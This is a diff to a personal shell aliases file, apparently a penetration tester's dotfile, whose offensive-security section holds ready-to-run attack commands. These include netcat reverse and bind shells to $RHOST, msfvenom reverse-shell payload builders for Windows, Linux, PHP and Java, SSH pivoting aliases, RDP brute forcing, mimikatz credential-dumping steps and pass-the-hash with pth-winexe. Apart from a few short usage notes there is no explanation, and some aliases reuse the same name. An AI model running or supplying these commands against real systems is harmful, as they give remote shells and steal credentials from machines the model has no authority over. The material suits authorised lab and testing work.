@@ -180,14 +180,14 @@ alias iptlistout='iptables -L OUTPUT -n -v --line-numbers'
 alias iptlistfw='iptables -L FORWARD -n -v --line-numbers'
 
 ### nc ### 
-alias nc-trad-rev='nc -e /bin/sh $RHOST $RPORT'
-alias nc-trad-bind='nc -e /bin/sh -l $LPORT'
-alias nc-trad-rev='nc -e /bin/bash $RHOST $RPORT'
-alias nc-trad-rev='nc -e /bin/bash -l $LPORT'
-alias nc-sh-rev='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $RHOST $RPORT >/tmp/f'
-alias nc-sh-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l $LPORT >/tmp/f'
-alias nc-bash-rev='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $RHOST $RPORT >/tmp/f'
-alias nc-bash-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -l $LPORT >/tmp/f'
+alias nc-trad-rev='nc -nv -e /bin/sh $RHOST $RPORT'
+alias nc-trad-bind='nc -nv -e /bin/sh -l $LPORT'
+alias nc-trad-rev='nc -nv -e /bin/bash $RHOST $RPORT'
+alias nc-trad-rev='nc -nv -e /bin/bash -l $LPORT'
+alias nc-sh-rev='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -nv $RHOST $RPORT >/tmp/f'
+alias nc-sh-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -nvl $LPORT >/tmp/f'
+alias nc-bash-rev='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -nv $RHOST $RPORT >/tmp/f'
+alias nc-bash-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -nvl $LPORT >/tmp/f'
 
 ### nmap ###
 alias nmap-quick='sudo -E nmap $RHOST -vv -n --open --reason -sC -sV -sS -F -oA $RHOST"_nmap_quick"'
@@ -290,13 +290,9 @@ alias vscr="code --reuse-windows"   # Force to open a file or folder in the last
 alias webify="mogrify -resize 690\> *.png"
 alias whatismyip="curl icanhazip.com"
 
-
 ### OFFSEC ###
 export OFFKIT="/offsec/git/snare-ng"
 export OFFSTAGE="/offsec/stage"
-
-# offsec commands
-alias ostage="cp -t $OFFSTAGE -R "
 
 # enumeration
 alias enum_dns_zone="$OFFKIT/Enumeration/DNS/enum-domain-zone.sh "
@@ -309,10 +305,8 @@ alias enum_smb_rpcclient="$OFFKIT/Enumeration/SMB/rpcclient.sh "
 alias enum_snmp_161="$OFFKIT/Enumeration/SNMP/onesixtyone-enum.sh"
 alias enum_snmp_check="$OFFKIT/Enumeration/SNMP/snmp-check.sh"
 alias enum_snmp_walk="$OFFKIT/Enumeration/SNMP/snmpwalk.sh"
-
 alias enum_ssh="$OFFKIT/Enumeration/SSH/ssh-enum.sh "
 alias enum_http="$OFFKIT/Enumeration/WEB/http-enum.sh "
-
 alias enum_nse_ftp="$OFFKIT/Enumeration/FTP/ftp.nse.sh "
 alias enum_nse_imap="$OFFKIT/Enumeration/IMAP/imap.nse.sh "
 alias enum_nse_pop="$OFFKIT/Enumeration/POP/pop-nse.sh "
@@ -327,8 +321,48 @@ alias brute_ftp_hydra="$OFFKIT/Enumeration/FTP/ftp-bruteforce.sh "
 alias brute_ssh_medusa="$OFFKIT/Enumeration/SSH/ssh-brute-medusa.sh "
 alias brute_ssh_hydra="$OFFKIT/Enumeration/SSH/ssh-brute-hydra.sh "
 alias brute_ssh_ncrack="$OFFKIT/Enumeration/SSH/ssh-brute-ncrack.sh "
+alias brute_rdp_crowbar="crowbar -b rdp -n 1 -s $RHOST "
+
+# Generation tools
+alias gen-wordlist="cewl -m 6 -w cewl-wordlist.txt $URL"
+
+# Proxy/Tunnel/Pivot
+# The following relies heavily on env_vars and specific ones
+# The following example should be used
+# 1.1.1.1 srv1
+# 2.2.2.2 dc1
+# 3.3.3.3 kali
+# :: ephemeral ports
+#
+#    local -L 3.3.3.3:1337:2.2.2.2:445 user@1.1.1.1
+#    3.3.3.3:1337 --> 22:1.1.1.1:: --> 2.2.2.2:445
+#       LHOST=3.3.3.3
+#       RHOST=2.2.2.2
+#       LPORT=1337
+#       RPORT=445
+#       SPROXY=1.1.1.1
+#       SUSER=user
+#
+#    remote -R 3.3.3.3:1337:2.2.2.2:445 kali@3.3.3.3 (as run from 1.1.1.1)
+#       LHOST=3.3.3.3
+#       RHOST=2.2.2.2
+#       LPORT=1337
+#       RPORT=445
+#       SPROXY=3.3.3.3
+#       SUSER=kali
+#
+# LHOST=Offensive Machine
+# RHOST=The final destination
+# LPORT=The bound port to be translated (1337)
+# RPORT=The translated port ()
+# SPROXY=The remote endpoint that we establish SSH to
+# SUSER=The remote username that we establish SSH with
+
+alias ssh-local-portfwd="ssh -N -L $LHOST:$LPORT:$RHOST:$RPORT $SUSER@$SPROXY"
+alias ssh-remote-portfwd="ssh -N -R $LHOST:$LPORT:$RHOST:$RPORT $SUSER@$LHOST"
 
 # other tools
+alias gcc-winpe='i686-w64-mingw32-gcc '
 alias john-unix="john --format=crypt "
 alias john-winlm="john --format=LM "
 alias john-winntlm="john --format=NTLM "
@@ -337,6 +371,10 @@ alias venom_stage_win_x86="msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LP
 alias venom_stage_win_x64="msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > shell-x64.exe"
 alias venom_sless_win_x86="msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > shell-x86.exe"
 alias venom_sless_win_x64="msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > shell-x64.exe"
+alias venom_stage_winps_x86="msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f powershell > shell-x86.ps1"
+alias venom_stage_winps_x64="msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f powershell > shell-x64.ps1"
+alias venom_sless_winps_x86="msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f powershell > shell-x86.ps1"
+alias venom_sless_winps_x64="msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f powershell > shell-x64.ps1"
 alias venom_stage_lin_x86="msfvenom -p linux/x86/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > shell-x86.elf"
 alias venom_stage_lin_x64="msfvenom -p linux/x64/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > shell-x64.elf"
 alias venom_sless_lin_x86="msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > shell-x86.elf"
@@ -346,24 +384,65 @@ alias venom_jsp="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPOR
 alias venom_php="msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw > shell.php"
 alias venom_war="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war > shell.war"
 #todo: smb-map
+
+
 #todo: impacket
-#todo: wine/gcc
+alias impacket-launchsmbserver='python smbserver.py NOPEROPE /offsec/stage'
+
 #todo: my-ftp/http/staging-area
 
+# attacking resources
+alias service-run-smb='impacket-launchsmbserver'
 
+# offsec commands
+alias ostage="cp -t $OFFSTAGE -R "
+
+# usage
+
+alias usage-crunch='
+echo crunch <MIN> <MAX> -t <MASK>
+echo , => Upper
+echo @ => lower
+echo ^ => Special
+echo % => Numeric
+'
 alias usage-mimikatz-logonpasswords='
 echo log C:\\Windows\\Temp\\mimi-creds.log
 echo privilege::debug 
 echo sekurlsa::logonpasswords
-exit
+echo exit
 '
-alias usage-mimikatz-ticketss='
+alias usage-mimikatz-tickets='
 echo log C:\\Windows\\Temp\\mimi-tickets.log
 echo privilege::debug 
 echo sekurlsa::tickets
-exit
+echo exit
+'
+alias usage-mimikatz-lsadump='
+echo log C:\\Windows\\Temp\\mimi-lsa.log
+echo privilege::debug 
+echo token::elevate
+echo lsadump::sam
+echo exit
+'
+alias usage-pth-winexe='
+echo pth-winexe -U DOM/USER%aad3b435b51404eeaad3b435b51404ee:NTLM_HASH //TARGET cmd
+echo pth-winexe -U DOM/USER%LM_HASH:NTLM_HASH //TARGET cmd
 '
 
+alias usage-ssh-local-portfwde='
+echo ssh -N -L <bind_addr>:<bind_port>:<target_addr>:<target_port> username@sshproxy.com
+echo ssh -N -L kali:445:dc1:445 kali@bounce
+echo `-- kali:445 ---> 22:bounce:Ephermal --> 445:dc1
+'
+
+alias usage-ssh-remote-portfwd='
+echo ssh -N -R <bind_addr>:<bind_port>:<target_addr>:<target_port> username@sshproxy.com
+echo ssh -N -R kali:4444:127.0.0.1:3306 kali@kali
+echo `-- localhost:3306 <-- 4444:kali
+echo ssh -N -R kali:4444:sql:3306 kali@kali
+echo `-- sql:3306 <-- Ephemeral:localhost:22 <-- 4444:kali
+'
 
 
 ### logstash ###
